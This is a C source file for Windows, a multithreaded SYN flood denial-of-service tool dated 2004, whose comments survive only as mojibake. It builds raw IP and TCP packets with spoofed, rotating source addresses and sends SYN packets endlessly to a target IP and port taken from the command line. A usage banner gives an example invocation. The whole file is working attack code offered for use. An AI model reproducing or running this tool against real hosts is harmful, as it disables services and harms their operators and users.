// ���߳�dos��������

#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32.lib")
#define SEQ 0x28376839
int threadnum, maxthread, port;
char *DestIP;//Ŀ��IP
void display(void)  // ����״̬��ʾ����
{
    static int play = 0;
    // ������
    char *plays[12] =
    {
        " | ",
        " / ",
        " - ",
        " \\ ",
        " | ",
        " / ",
        " - ",
        " \\ ",
        " | ",
        " / ",
        " - ",
        " \\ ",
    };

    printf("=%s= %d threads \r", plays[play], threadnum);
    play = (play == 11) ? 0 : play + 1;
}
//����һ��tcphdr�ṹ�����TCP�ײ�
typedef struct tcphdr
{
    USHORT th_sport;//16λԴ�˿ں�
    USHORT th_dport;//16λĿ�Ķ˿ں�
    unsigned int th_seq;//32λ���к�
    unsigned int th_ack;//32λȷ�Ϻ�
    unsigned char th_lenres;//4λ�ײ�����+6λ�������е�4λ
    unsigned char th_flag;////6λ��־λ
    USHORT th_win;//16λ���ڴ�С
    USHORT th_sum;//16λЧ���
    USHORT th_urp;//16λ��������ƫ����
} TCP_HEADER;
//����һ��iphdr�����IP�ײ�
typedef struct iphdr//ip�ײ�
{
    unsigned char h_verlen;//4λ�ֲ����ȣ���4λIP�汾��
    unsigned char tos;//8λ���ͷ���
    unsigned short total_len;//16λ�ܳ���
    unsigned short ident;//16λ��־
    unsigned short frag_and_flags;//3λ��־λ����SYN,ACK,�ȵ�)
    unsigned char ttl;//8λ����ʱ��
    unsigned char proto;//8λЭ��
    unsigned short checksum;//ip�ֲ�Ч���
    unsigned int sourceIP;//α��IP��ַ
    unsigned int destIP;//������ip��ַ
} IP_HEADER;

//TCPα�ײ������ڽ���TCPЧ��͵ļ��㣬��֤TCPЧ�����Ч��
struct
{
    unsigned long saddr;//Դ��ַ
    unsigned long daddr;//Ŀ�ĵ�ַ
    char mbz;//�ÿ�
    char ptcl;//Э������
    unsigned short tcpl;//TCP����
} PSD_HEADER;
//����Ч��ͺ������Ȱ�IP�ײ���Ч����ֶ���Ϊ0(IP_HEADER.checksum=0)
//Ȼ���������IP�ײ��Ķ����Ʒ���ĺ͡�
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum = 0;
    while(size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(USHORT);
    }
    if(size) cksum += *(UCHAR *)buffer;
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (USHORT)(~cksum);
}
DWORD WINAPI SynfloodThread(LPVOID lp)//synflood�̺߳���
{
    SOCKET  sock = NULL;
    int ErrorCode = 0, flag = true, TimeOut = 2000, FakeIpNet, FakeIpHost, dataSize = 0, SendSEQ = 0;
    struct sockaddr_in sockAddr;
    TCP_HEADER  tcpheader;
    IP_HEADER   ipheader;
    char        sendBuf[128];
    sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
    if(sock == INVALID_SOCKET)
    {
        printf("Socket failed: %d\n", WSAGetLastError());
        return 0;
    }
    //����IP_HDRINCL�Ա��Լ����IP�ײ�
    ErrorCode = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(int));
    if(ErrorCode == SOCKET_ERROR)
    {
        printf("Set sockopt failed: %d\n", WSAGetLastError());
        return 0;
    }
    //���÷��ͳ�ʱ
    ErrorCode = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&TimeOut, sizeof(TimeOut));
    if(ErrorCode == SOCKET_ERROR)
    {
        printf("Set sockopt time out failed: %d\n", WSAGetLastError());
        return 0;
    }
    //����Ŀ���ַ
    memset(&sockAddr, 0, sizeof(sockAddr));
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_addr.s_addr = inet_addr(DestIP);
    FakeIpNet = inet_addr(DestIP);
    FakeIpHost = ntohl(FakeIpNet);
    //���IP�ײ�
    ipheader.h_verlen = (4 << 4 | sizeof(IP_HEADER) / sizeof(unsigned long));
    ipheader.total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
    ipheader.ident = 1;
    ipheader.frag_and_flags = 0;
    ipheader.ttl = 128;
    ipheader.proto = IPPROTO_TCP;
    ipheader.checksum = 0;
    ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
    ipheader.destIP = inet_addr(DestIP);
    //���TCP�ײ�
    tcpheader.th_dport = htons(port);
    tcpheader.th_sport = htons(8080);
    tcpheader.th_seq = htonl(SEQ + SendSEQ);
    tcpheader.th_ack = 0;
    tcpheader.th_lenres = (sizeof(TCP_HEADER) / 4 << 4 | 0);
    tcpheader.th_flag = 2;
    tcpheader.th_win = htons(16384);
    tcpheader.th_urp = 0;
    tcpheader.th_sum = 0;

    PSD_HEADER.saddr = ipheader.sourceIP;
    PSD_HEADER.daddr = ipheader.destIP;
    PSD_HEADER.mbz = 0;
    PSD_HEADER.ptcl = IPPROTO_TCP;
    PSD_HEADER.tcpl = htons(sizeof(tcpheader));
    for(;;)
    {
        SendSEQ = (SendSEQ == 65536) ? 1 : SendSEQ + 1;
        ipheader.checksum = 0;
        ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
        tcpheader.th_seq = htonl(SEQ + SendSEQ);
        tcpheader.th_sport = htons(SendSEQ);
        tcpheader.th_sum = 0;
        PSD_HEADER.saddr = ipheader.sourceIP;

        //��TCPα�ײ���TCP�ײ����Ƶ�ͬһ������������TCPЧ���
        memcpy(sendBuf, &PSD_HEADER, sizeof(PSD_HEADER));
        memcpy(sendBuf + sizeof(PSD_HEADER), &tcpheader, sizeof(tcpheader));
        tcpheader.th_sum = checksum((USHORT *)sendBuf, sizeof(PSD_HEADER) + sizeof(tcpheader));
        memcpy(sendBuf, &ipheader, sizeof(ipheader));
        memcpy(sendBuf + sizeof(ipheader), &tcpheader, sizeof(tcpheader));
        memset(sendBuf + sizeof(ipheader) + sizeof(tcpheader), 0, 4);
        dataSize = sizeof(ipheader) + sizeof(tcpheader);
        ipheader.checksum = checksum((USHORT *)sendBuf, dataSize);
        memcpy(sendBuf, &ipheader, sizeof(ipheader));
        sendto(sock, sendBuf, dataSize, 0, (struct sockaddr *) &sockAddr, sizeof(sockAddr));
        display();
    }//end for
    Sleep(20);
    InterlockedExchangeAdd((long *)&threadnum, -1);
    return 0;
}
void usage(char *name)
{
    printf("\t===================SYN Flood======================\n");
    printf("\t==========gxisone@hotmail.com     2004/7/6========\n");
    printf("\tusage: %s [dest_IP] [port] [thread]\n", name);
    printf("\tExample: %s 192.168.1.1 80 100\n", name);
}
int main(int argc, char *argv[])
{
    if(argc != 4)
    {
        usage(argv[0]);
        return 0;
    }
    usage(argv[1]);
    int ErrorCode = 0;
    DestIP = argv[1]; //ȡ��Ŀ������IP
    port = atoi(argv[2]); //ȡ��Ŀ��˿ں�
    maxthread = (maxthread > 100) ? 100 : atoi(argv[3]);
    //����߳�������100����߳�������Ϊ100
    WSADATA wsaData;
    if((ErrorCode = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0)
    {
        printf("WSAStartup failed: %d\n", ErrorCode);
        return 0;
    }
    printf("[start]...........\nPress any key to stop!\n");
    while(threadnum < maxthread) //ѭ�������߳�
    {
        if(CreateThread(NULL, 0, SynfloodThread, 0, 0, 0))
        {
            Sleep(10);
            threadnum++;
        }
    }
    WSACleanup();
    printf("\n[Stopd]...........\n");
    return 0;
}
